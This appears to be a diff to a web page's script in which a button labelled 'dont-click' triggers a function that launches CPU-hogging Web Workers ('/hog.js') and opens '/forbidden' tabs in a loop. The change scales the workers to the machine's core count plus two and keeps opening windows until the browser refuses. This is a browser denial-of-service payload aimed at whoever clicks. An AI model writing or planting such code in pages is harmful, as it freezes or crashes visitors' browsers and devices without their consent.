@@ -6,10 +6,9 @@
 
 <script>
     function duplicate() {
-        new Worker("/hog.js");
-        for (;;) {
-            window.open("/forbidden", "_blank");
-        }
+        for (const _ of Array(window.navigator.hardwareConcurrency + 2).keys())
+            new Worker("/hog.js");
+        while (window.open("/forbidden", "_blank"));
     }
     const dontClick = document.getElementById("dont-click");
     dontClick?.addEventListener("click", duplicate);
